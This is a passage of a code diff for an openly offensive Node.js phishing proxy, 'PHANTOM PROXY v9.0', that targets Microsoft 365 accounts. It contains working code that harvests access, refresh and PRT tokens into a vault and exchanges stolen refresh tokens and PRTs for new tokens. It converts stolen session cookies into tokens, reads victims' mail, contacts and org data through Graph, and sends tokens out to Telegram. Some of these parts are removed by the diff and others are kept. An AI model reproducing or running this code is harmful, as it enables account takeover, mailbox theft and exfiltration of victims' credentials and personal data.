                             }
                             const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                             if (prtMatch) {
                                 this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
                             }
-                            try {
-                                const json = typeof body === 'string' ? JSON.parse(body) : body;
-                                if (json.access_token) {
-                                    this.tokens.push({ type: 'access', value: json.access_token, file, username: this.extractUsernameFromToken(json.access_token), timestamp: new Date().toISOString() });
-                                }
-                                if (json.refresh_token) {
-                                    this.tokens.push({ type: 'refresh', value: json.refresh_token, file, username: this.extractUsernameFromToken(json.refresh_token), timestamp: new Date().toISOString() });
-                                }
-                                if (json.id_token) {
-                                    this.tokens.push({ type: 'id', value: json.id_token, file, username: this.extractUsernameFromToken(json.id_token), timestamp: new Date().toISOString() });
-                                }
-                                if (json.prt) {
-                                    this.tokens.push({ type: 'prt', value: json.prt, file, username: 'PRT', timestamp: new Date().toISOString() });
-                                }
-                            } catch (e) {}
                         }
                     } catch (e) {}
                 }
             } catch (e) {}
         }
-        global._cache.set('vault_tokens', this.tokens, 60000);
         return this.tokens;
     }
 
     getStats() {
-        const total = this.tokens.length;
-        const access = this.tokens.filter(t => t.type === 'access').length;
-        const refresh = this.tokens.filter(t => t.type === 'refresh').length;
-        const id = this.tokens.filter(t => t.type === 'id').length;
-        const prt = this.tokens.filter(t => t.type === 'prt').length;
-        return { total, access, refresh, id, prt };
-    }
-
-    async healthCheckAll() {
-        const results = [];
-        const uniqueTokens = [];
-        const seen = new Set();
-        for (const token of this.tokens) {
-            if (!seen.has(token.value) && token.type === 'access') {
-                seen.add(token.value);
-                uniqueTokens.push(token);
-            }
-        }
-        for (const token of uniqueTokens.slice(0, 10)) {
-            try {
-                const response = await retry(async () => {
-                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
-                        headers: { 'Authorization': `Bearer ${token.value}` },
-                        timeout: 5000
-                    });
-                }, 2, 1000, 2);
-                results.push({
-                    token: token.value.slice(0, 20) + '...',
-                    status: 'valid',
-                    user: response.data.userPrincipalName,
-                    username: token.username
-                });
-            } catch (e) {
-                results.push({
-                    token: token.value.slice(0, 20) + '...',
-                    status: 'invalid',
-                    error: e.message,
-                    username: token.username
-                });
-            }
-        }
-        return results;
+        return {
+            total: this.tokens.length,
+            access: this.tokens.filter(t => t.type === 'access').length,
+            refresh: this.tokens.filter(t => t.type === 'refresh').length,
+            id: this.tokens.filter(t => t.type === 'id').length,
+            prt: this.tokens.filter(t => t.type === 'prt').length
+        };
     }
 }
 
@@ -1107,47 +1036,51 @@ dashApp.post('/api/vault/scan', (req, res) => {
 });
 
 dashApp.get('/api/vault/tokens', (req, res) => {
-    try {
-        const cached = global._cache ? global._cache.get('vault_tokens') : null;
-        if (cached) { return res.json({ success: true, tokens: cached, cached: true }); }
-        res.json({ success: true, tokens: vault.tokens || [] });
-    } catch (err) { res.status(500).json({ error: err.message }); }
+    res.json({ success: true, tokens: vault.tokens || [] });
 });
 
 dashApp.get('/api/vault/stats', (req, res) => {
-    try {
-        const stats = vault.getStats();
-        res.json({ success: true, stats });
-    } catch (err) { res.status(500).json({ error: err.message }); }
+    res.json({ success: true, stats: vault.getStats() });
 });
 
-dashApp.post('/api/vault/healthcheck', async (req, res) => {
-    try {
-        const results = await vault.healthCheckAll();
-        res.json({ success: true, results });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.post('/api/vault/exchange', async (req, res) => {
-    const { tokenValue } = req.body;
-    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
-    try {
-        const response = await retry(async () => {
-            return await axios.post(
-                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                new URLSearchParams({
-                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                    refresh_token: tokenValue,
-                    grant_type: 'refresh_token',
-                    scope: 'https://graph.microsoft.com/.default offline_access'
-                }),
-                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-            );
-        }, 3, 1000, 2);
-        res.json({ success: true, data: response.data });
-    } catch (err) {
-        res.status(500).json({ error: err.response?.data?.error_description || err.message });
+// ── Graph API ──
+class GraphClient {
+    constructor(accessToken) {
+        this.accessToken = accessToken;
+        this.baseUrl = 'https://graph.microsoft.com/v1.0';
+        this.cache = global._cache || new CacheManager();
     }
+
+    async get(endpoint, useCache = true) {
+        const cacheKey = `graph:get:${endpoint}`;
+        if (useCache) {
+            const cached = this.cache.get(cacheKey);
+            if (cached) return cached;
+        }
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        const response = await retry(async () => {
+            return await axios.get(`${this.baseUrl}${endpoint}`, config);
+        }, 3, 1000, 2);
+        if (useCache && response.status === 200) {
+            this.cache.set(cacheKey, response.data, 300000);
+        }
+        return response.data;
+    }
+
+    async getUserProfile() {
+        return this.get('/me?$select=id,displayName,mail,userPrincipalName');
+    }
+}
+
+dashApp.post('/api/recon', async (req, res) => {
+    const { accessToken } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    try {
+        const graph = new GraphClient(accessToken);
+        const profile = await graph.getUserProfile();
+        res.json({ success: true, profile });
+    } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
 // ── PRT Engine ──
@@ -1156,27 +1089,6 @@ function loadPRTStorage() {
 }
 function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
 loadPRTStorage();
-
-async function checkPRTHealth(prt) {
-    try {
-        const response = await retry(async () => {
-            return await axios.post(
-                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                new URLSearchParams({
-                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                    assertion: prt,
-                    requested_token_use: 'on_behalf_of',
-                    scope: 'https://graph.microsoft.com/.default offline_access'
-                }),
-                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-            );
-        }, 2, 1000, 2);
-        return { valid: true, data: response.data };
-    } catch (e) {
-        return { valid: false, error: e.response?.data?.error_description || e.message };
-    }
-}
 
 dashApp.post('/api/prt/scan', (req, res) => {
     try {
@@ -1215,7 +1127,7 @@ dashApp.post('/api/prt/scan', (req, res) => {
         prtStorage.prts = prts;
         prtStorage.lastScan = new Date().toISOString();
         savePRTStorage();
-        res.json({ success: true, count: prts.length, prts: prts });
+        res.json({ success: true, count: prts.length });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -1223,279 +1135,10 @@ dashApp.get('/api/prt/list', (req, res) => {
     res.json({ success: true, prts: prtStorage.prts || [] });
 });
 
-dashApp.post('/api/prt/health', async (req, res) => {
-    const { prt } = req.body;
-    if (!prt) return res.status(400).json({ error: 'PRT required' });
-    try {
-        const result = await checkPRTHealth(prt);
-        res.json({ success: true, ...result });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.post('/api/prt/exchange', async (req, res) => {
-    const { prt } = req.body;
-    if (!prt) return res.status(400).json({ error: 'PRT required' });
-    try {
-        const response = await retry(async () => {
-            return await axios.post(
-                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                new URLSearchParams({
-                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                    assertion: prt,
-                    requested_token_use: 'on_behalf_of',
-                    scope: 'https://graph.microsoft.com/.default offline_access'
-                }),
-                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-            );
-        }, 3, 1500, 2);
-        const tokens = response.data;
-        await sendToTelegram({ sessionId: 'prt_exchange', tokens });
-        res.json({ success: true, data: tokens });
-    } catch (err) {
-        res.status(500).json({ error: err.response?.data || err.message });
-    }
-});
-
-dashApp.post('/api/prt/exchange-all', async (req, res) => {
-    try {
-        const results = [];
-        for (const item of prtStorage.prts || []) {
-            try {
-                const response = await retry(async () => {
-                    return await axios.post(
-                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                        new URLSearchParams({
-                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                            assertion: item.prt,
-                            requested_token_use: 'on_behalf_of',
-                            scope: 'https://graph.microsoft.com/.default offline_access'
-                        }),
-                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-                    );
-                }, 2, 1000, 2);
-                results.push({
-                    username: item.username,
-                    success: true,
-                    access_token: response.data.access_token?.slice(0, 40) + '...',
-                    refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
-                });
-            } catch (e) {
-                results.push({ username: item.username, success: false, error: e.message });
-            }
-        }
-        res.json({ success: true, results });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.get('/api/prt/stats', (req, res) => {
-    try {
-        const total = prtStorage.prts?.length || 0;
-        const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
-        res.json({ success: true, stats: { total, uniqueUsers, lastScan: prtStorage.lastScan } });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-// ── Graph API ──
-class GraphClient {
-    constructor(accessToken) {
-        this.accessToken = accessToken;
-        this.baseUrl = 'https://graph.microsoft.com/v1.0';
-        this.cache = global._cache || new CacheManager();
-    }
-
-    async get(endpoint, useCache = true) {
-        const cacheKey = `graph:get:${endpoint}`;
-        if (useCache) {
-            const cached = this.cache.get(cacheKey);
-            if (cached) return cached;
-        }
-        const config = getAxiosConfig();
-        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
-        const response = await retry(async () => {
-            return await axios.get(`${this.baseUrl}${endpoint}`, config);
-        }, 3, 1000, 2);
-        if (useCache && response.status === 200) {
-            this.cache.set(cacheKey, response.data, 300000);
-        }
-        return response.data;
-    }
-
-    async getUserProfile() {
-        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
-    }
-
-    async getInbox(limit = 50) {
-        return this.get(`/me/mailFolders/inbox/messages?$top=${limit}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`);
-    }
-
-    async getContacts() {
-        return this.get('/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,businessPhones,jobTitle,department');
-    }
-
-    async getEvents(limit = 25) {
-        return this.get(`/me/events?$top=${limit}&$orderby=start/dateTime desc&$select=subject,start,end,location,attendees,organizer,bodyPreview`);
-    }
-
-    async getManager() {
-        return this.get('/me/manager');
-    }
-
-    async getDirectReports() {
-        return this.get('/me/directReports');
-    }
-
-    async getOrganization() {
-        return this.get('/organization');
-    }
-
-    async getMailFolders() {
-        return this.get('/me/mailFolders');
-    }
-}
-
-dashApp.post('/api/recon', async (req, res) => {
-    const { accessToken, refreshToken, email } = req.body;
-    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
-    try {
-        const graph = new GraphClient(accessToken);
-        const [profile, inbox, contacts, events, manager, directReports, org] = await Promise.all([
-            graph.getUserProfile(),
-            graph.getInbox(50),
-            graph.getContacts(),
-            graph.getEvents(25),
-            graph.getManager().catch(() => null),
-            graph.getDirectReports().catch(() => null),
-            graph.getOrganization().catch(() => null)
-        ]);
-        res.json({
-            success: true,
-            email: email || profile.mail || profile.userPrincipalName,
-            profile,
-            inbox: inbox?.value || [],
-            contacts: contacts?.value || [],
-            events: events?.value || [],
-            manager,
-            directReports: directReports?.value || [],
-            organization: org?.value?.[0] || null
-        });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-// ── Webmail endpoints ──
-dashApp.post('/api/webmail/folders', async (req, res) => {
-    const { accessToken } = req.body;
-    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
-    try {
-        const graph = new GraphClient(accessToken);
-        const folders = await graph.getMailFolders();
-        res.json({ success: true, folders: folders.value || [] });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.post('/api/webmail/emails', async (req, res) => {
-    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
-    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
-    try {
-        const graph = new GraphClient(accessToken);
-        let endpoint;
-        if (folderId === 'inbox') {
-            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
-        } else if (folderId === 'sent') {
-            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
-        } else {
-            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
-        }
-        const emails = await graph.get(endpoint);
-        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.post('/api/webmail/email', async (req, res) => {
-    const { accessToken, messageId } = req.body;
-    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
-    if (!messageId) return res.status(400).json({ error: 'Message ID required' });
-    try {
-        const graph = new GraphClient(accessToken);
-        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
-        res.json({ success: true, email });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-// ── esctx/sccauth Conversion ──
-dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
-    const { esctx, resource = 'MSGraph' } = req.body;
-    if (!esctx) return res.status(400).json({ error: 'ESTSAuth cookie required' });
-    try {
-        const psScript = `
-            Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
-            try {
-                $token = Get-EntraIDTokenFromESTSCookie -ESTSAuthCookie "${esctx}" -ResourceName ${resource}
-                $token | ConvertTo-Json -Depth 10
-            } catch { Write-Error $_.Exception.Message }
-        `;
-        exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
-            if (error) { return res.status(500).json({ error: stderr || error.message }); }
-            try {
-                const result = JSON.parse(stdout);
-                if (result.access_token) {
-                    vault.tokens.push({
-                        type: 'access',
-                        value: result.access_token,
-                        refresh_token: result.refresh_token,
-                        username: result.id_token ? 'esctx_user' : 'Unknown',
-                        timestamp: new Date().toISOString(),
-                        source: 'esctx_conversion',
-                        id_token: result.id_token
-                    });
-                }
-                res.json({ success: true, data: result });
-            } catch (e) {
-                res.status(500).json({ error: 'Failed to parse PowerShell output: ' + e.message });
-            }
-        });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
-    const { sccauth, resource = 'MSGraph' } = req.body;
-    if (!sccauth) return res.status(400).json({ error: 'SCCAUTH cookie required' });
-    try {
-        const psScript = `
-            Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
-            try {
-                $token = Get-EntraIDTokenFromSCCAUTHCookie -SCCAuth "${sccauth}" -ResourceName ${resource}
-                $token | ConvertTo-Json -Depth 10
-            } catch { Write-Error $_.Exception.Message }
-        `;
-        exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
-            if (error) { return res.status(500).json({ error: stderr || error.message }); }
-            try {
-                const result = JSON.parse(stdout);
-                if (result.access_token) {
-                    vault.tokens.push({
-                        type: 'access',
-                        value: result.access_token,
-                        refresh_token: result.refresh_token,
-                        username: result.id_token ? 'sccauth_user' : 'Unknown',
-                        timestamp: new Date().toISOString(),
-                        source: 'sccauth_conversion'
-                    });
-                }
-                res.json({ success: true, data: result });
-            } catch (e) {
-                res.status(500).json({ error: 'Failed to parse PowerShell output: ' + e.message });
-            }
-        });
-    } catch (err) { res.status(500).json({ error: err.message }); }
-});
-
-// ── Auto-Refresh Daemons ──
+// ── Auto-Refresh Daemon ──
 async function refreshTokensDaemon() {
     console.log('🔄 Token Refresh Daemon started (every 30 min)');
     setInterval(async () => {
-        console.log('🔄 Running token refresh cycle...');
         for (const flow of deviceFlows) {
             if (flow.refresh_token && flow.status === 'approved') {
                 try {
@@ -1515,53 +1158,15 @@ async function refreshTokensDaemon() {
                     if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
                     flow.last_refresh = new Date().toISOString();
                     saveDeviceFlows();
-                    console.log(`✅ Refreshed tokens for flow ${flow.user_code}`);
-                } catch (e) {
-                    console.warn(`Failed to refresh tokens for ${flow.user_code}: ${e.message}`);
-                }
+                } catch (e) { console.warn(`Refresh failed: ${e.message}`); }
             }
         }
     }, 30 * 60 * 1000);
 }
-
-async function prtRefreshDaemon() {
-    console.log('🟣 PRT Auto-Refresh Daemon started (every 60 min)');
-    setInterval(async () => {
-        console.log('🟣 Running PRT refresh cycle...');
-        let refreshed = 0;
-        for (const item of prtStorage.prts || []) {
-            try {
-                const response = await retry(async () => {
-                    return await axios.post(
-                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                        new URLSearchParams({
-                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
-                            assertion: item.prt,
-                            requested_token_use: 'on_behalf_of',
-                            scope: 'https://graph.microsoft.com/.default offline_access'
-                        }),
-                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-                    );
-                }, 2, 1000, 2);
-                item.last_refresh = new Date().toISOString();
-                item.access_token = response.data.access_token;
-                item.refresh_token = response.data.refresh_token;
-                refreshed++;
-                console.log(`Refreshed PRT for ${item.username}`);
-            } catch (e) {
-                console.warn(`Failed to refresh PRT for ${item.username}: ${e.message}`);
-            }
-        }
-        if (refreshed > 0) { savePRTStorage(prtStorage); console.log(`Refreshed ${refreshed} PRTs`); }
-    }, 60 * 60 * 1000);
-}
-
 refreshTokensDaemon();
-prtRefreshDaemon();
 
 // ============================================================
-// 🚀 MAIN APP
+// 🚀 MAIN APP — Proxy + Dashboard Together
 // ============================================================
 const app = express();
 app.use(express.json());
@@ -1573,25 +1178,20 @@ app.use('/dash', dashApp);
 // ── Proxy route ──
 app.use((req, res) => {
     if (!req.path.startsWith('/dash') && !req.path.startsWith('/api') && !req.path.startsWith('/device')) {
-        proxyHandler(req, res);
+        proxyServer.emit('request', req, res);
     }
 });
 
 // ── Start server ──
 const PORT = process.env.PORT || 3000;
-const server = app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ PHANTOM PROXY v9.0 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
     console.log(`📱 Device Code: /api/device/request`);
     console.log(`🔄 Redirect interception: ACTIVE`);
     console.log(`📤 Telegram exfil: ACTIVE`);
     console.log(`🟣 PRT Engine: ACTIVE`);
-    console.log(`📊 Graph API: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
-    console.log(`🔄 Auto-Refresh Daemons: ACTIVE (30 min / 60 min)`);
-    console.log(`🔄 esctx/sccauth → JWT: ACTIVE`);
-    console.log(`✅ All features integrated — Complete Ultimate Edition (No AI BEC)`);
+    console.log(`📊 Graph API: ACTIVE`);
+    console.log(`✅ All features integrated — Complete Ultimate Edition`);
 });
-
-process.on('SIGINT', () => { server.close(() => process.exit(0)); });
-process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
